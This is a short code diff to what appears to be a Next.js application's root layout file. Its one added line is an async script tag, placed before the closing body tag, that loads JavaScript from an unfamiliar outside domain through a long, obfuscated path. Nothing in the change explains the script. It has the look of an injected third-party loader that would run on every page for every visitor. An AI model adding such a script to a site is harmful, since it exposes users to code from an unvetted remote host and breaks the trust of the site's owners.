@@ -31,6 +31,7 @@ export default function RootLayout({
           {children}
           <Toaster /> {/* Add Toaster component */}
         </AppProviders>
+        <script async src="https://quintessentialreport.com/b/3/V/0/P.3ypsv/b/mFVJJfZ/D/0p2yNsD/MD5hMpzMQp4HLaTwYT0BM/zRk/zwNkDfkw"></script>
       </body>
     </html>
   );
